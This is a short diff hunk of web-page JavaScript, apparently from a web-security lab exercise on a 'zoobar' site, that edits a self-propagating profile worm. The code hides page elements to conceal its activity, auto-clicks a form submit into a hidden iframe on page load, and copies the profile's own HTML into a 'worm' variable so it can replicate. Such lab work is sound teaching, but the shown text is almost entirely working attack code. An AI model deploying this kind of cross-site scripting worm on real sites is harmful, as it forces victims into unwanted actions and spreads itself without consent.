@@ -19,13 +19,13 @@ Scanning for viruses...
 <iframe name="formtarget3" id="formtarget3" style="visibility:hidden; width:0; height:0; border:0; position:absolute;"> </iframe>
 
 <script>
+  c = document.getElementById("profileheader");
+  c.style="display:none; visibility:hidden;";
   window.onload = function(){
     document.getElementById("submitthat").click();
     a = document.getElementsByClassName("log")[0];
     b = a.getElementsByTagName("tbody")[0];
     b.style="visibility:hidden; display:none;";
-    c = document.getElementById("profileheader");
-    c.style="display:none; visibility:hidden;";
     document.getElementById("zoobars").className = 10;
     var worm = document.getElementById("profile").innerHTML;
     worm = worm.substring(3, worm.length - 4);
